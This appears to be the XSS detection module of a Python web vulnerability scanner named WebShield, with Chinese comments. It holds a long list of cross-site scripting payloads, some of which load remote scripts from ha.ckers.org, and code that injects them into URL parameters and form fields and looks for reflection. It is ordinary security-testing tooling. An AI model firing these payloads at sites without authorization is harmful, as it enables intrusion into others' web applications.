#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
WebShield - Web应用漏洞扫描器
XSS(跨站脚本)漏洞检测模块
"""

import logging
import urllib.parse
import re
import requests
from bs4 import BeautifulSoup

# 配置日志
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class XSSDetector:
    """XSS(跨站脚本)漏洞检测类"""
    
    def __init__(self, timeout=10, headers=None):
        """
        初始化XSS检测器
        
        参数:
            timeout (int): 请求超时时间(秒)
            headers (dict): 请求头
        """
        self.timeout = timeout
        self.headers = headers or {
            'User-Agent': 'WebShield-Scanner/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        # XSS测试向量 - 基本
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "<script>/* */alert(1)/* */</script>",
            "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
            "'\"><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<iframe src=\"javascript:alert('XSS');\"></iframe>",
            "<ScRiPt>alert('XSS')</sCriPt>",
            "<a href=\"javascript:alert('XSS')\">点击我</a>",
            "<div style=\"background-image: url(javascript:alert('XSS'))\"></div>",
            "<div style=\"width: expression(alert('XSS'))\"></div>",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
            "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
            "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
            "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
            "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
            "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
            "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
            "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
            "<SCRIPT SRC=//ha.ckers.org/.j>",
            "<IMG SRC=\"javascript:alert('XSS')\"",
            "<SCRIPT>a=/XSS/\nalert(a.source)</SCRIPT>",
            "\\\\;alert('XSS');//",
            "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
            "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
            "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
            "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
            "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
            "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
            "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
            "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
            "<DIV STYLE=\"width: expression(alert('XSS'));\">",
            "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",
            "<XSS STYLE=\"behavior: url(http://ha.ckers.org/xss.htc);\">",
            "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
            "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
            "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
            "<BASE HREF=\"javascript:alert('XSS');//\">",
            "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>",
            "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>",
            "<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
            "<XML SRC=\"http://ha.ckers.org/xsstest.xml\" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
            "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"></t:set></BODY></HTML>",
        ]
    
    def scan_urls(self, crawler_results):
        """
        扫描URL列表，检测XSS漏洞
        
        参数:
            crawler_results (dict): 爬虫结果，包含URLs和表单
            
        返回:
            list: 检测到的XSS漏洞列表
        """
        vulnerabilities = []
        
        # 检查URL参数
        if 'urls_with_params' in crawler_results:
            for base_url, param_lists in crawler_results['urls_with_params'].items():
                for param_list in param_lists:
                    # 构建测试URL
                    for param in param_list:
                        for payload in self.xss_payloads:
                            # 测试单个参数
                            test_params = {p: 'test' for p in param_list}
                            test_params[param] = payload
                            
                            # 构建测试URL
                            test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"
                            
                            # 测试XSS
                            vulnerability = self._test_xss(test_url, param, payload)
                            if vulnerability:
                                vulnerabilities.append(vulnerability)
                                # 一旦发现参数存在漏洞，就停止测试该参数的其他Payload
                                break
        
        # 检查表单
        if 'forms' in crawler_results:
            for form in crawler_results.get('forms', []):
                vulnerabilities.extend(self._test_form(form))
        
        return vulnerabilities
    
    def _test_xss(self, url, param=None, payload=None, data=None, method='GET'):
        """
        测试单个URL或表单是否存在XSS漏洞
        
        参数:
            url (str): 要测试的URL
            param (str, optional): 被测试的参数名
            payload (str, optional): 被注入的Payload
            data (dict, optional): POST数据
            method (str): 请求方法，GET或POST
            
        返回:
            dict: 如果存在漏洞，返回漏洞信息；否则返回None
        """
        try:
            logger.info(f"测试XSS: {url}, 参数: {param}, Payload: {payload}")
            
            if method.upper() == 'GET':
                response = requests.get(
                    url, 
                    headers=self.headers, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
            else:
                response = requests.post(
                    url, 
                    data=data, 
                    headers=self.headers, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            # 检查响应是否包含Payload
            # 注意: 这种检测方法相对简单，实际应用中可能需要更复杂的判断逻辑
            decoded_payload = urllib.parse.unquote(payload)
            
            # 使用正则表达式检查各种变体
            # 构建一个保守的正则表达式，忽略大小写和一些可能的转义
            payload_regex = re.escape(decoded_payload)
            payload_regex = payload_regex.replace('\\<', '<').replace('\\>', '>')
            
            if re.search(payload_regex, response.text, re.IGNORECASE):
                return {
                    'type': 'xss',
                    'url': url,
                    'method': method,
                    'param': param,
                    'payload': payload,
                    'evidence': f"在响应中发现未过滤的XSS Payload",
                    'risk': 'high',
                    'confidence': 'medium'
                }
            
            # 检查是否对特殊字符进行了不完全的过滤
            # 这里只是一个简化的检查，真实环境中需要更复杂的逻辑
            if '<script>' in decoded_payload.lower() and '<script>' in response.text.lower():
                return {
                    'type': 'xss',
                    'url': url,
                    'method': method,
                    'param': param,
                    'payload': payload,
                    'evidence': f"在响应中发现部分未过滤的脚本标签",
                    'risk': 'high',
                    'confidence': 'low'
                }
            
            # 检查是否有事件处理程序
            for event in ['onload', 'onerror', 'onclick', 'onmouseover']:
                if event in decoded_payload.lower() and event in response.text.lower():
                    return {
                        'type': 'xss',
                        'url': url,
                        'method': method,
                        'param': param,
                        'payload': payload,
                        'evidence': f"在响应中发现事件处理程序: {event}",
                        'risk': 'high',
                        'confidence': 'medium'
                    }
                
        except Exception as e:
            logger.error(f"测试XSS时出错: {url}, 错误: {str(e)}")
        
        return None
    
    def _test_form(self, form):
        """
        测试表单是否存在XSS漏洞
        
        参数:
            form (dict): 表单信息
            
        返回:
            list: 检测到的XSS漏洞列表
        """
        vulnerabilities = []
        
        try:
            action_url = form['action']
            method = form['method'].upper()
            
            # 对每个输入字段进行测试
            for input_field in form['inputs']:
                field_name = input_field['name']
                field_type = input_field['type']
                
                # 跳过类型为submit、button、image的字段
                if field_type in ['submit', 'button', 'image', 'reset', 'file']:
                    continue
                
                # 为其他字段创建基本数据
                for payload in self.xss_payloads:
                    # 创建测试数据
                    test_data = {}
                    for inp in form['inputs']:
                        # 对非测试字段使用默认值
                        if inp['name'] != field_name:
                            if inp['type'] in ['submit', 'button', 'image', 'reset']:
                                continue
                            elif inp['type'] == 'checkbox':
                                test_data[inp['name']] = 'on'
                            else:
                                test_data[inp['name']] = inp['value'] or 'test'
                    
                    # 设置测试字段的值为Payload
                    test_data[field_name] = payload
                    
                    # 执行测试
                    if method == 'GET':
                        # 对于GET请求，将表单数据附加到URL中
                        test_url = f"{action_url}?{urllib.parse.urlencode(test_data)}"
                        vulnerability = self._test_xss(test_url, field_name, payload, method='GET')
                    else:
                        # 对于POST请求，将表单数据放在请求体中
                        vulnerability = self._test_xss(action_url, field_name, payload, data=test_data, method='POST')
                    
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        break  # 发现漏洞后停止测试该字段的其他Payload
        
        except Exception as e:
            logger.error(f"测试表单XSS时出错: {form.get('action', '')}, 错误: {str(e)}")
        
        return vulnerabilities 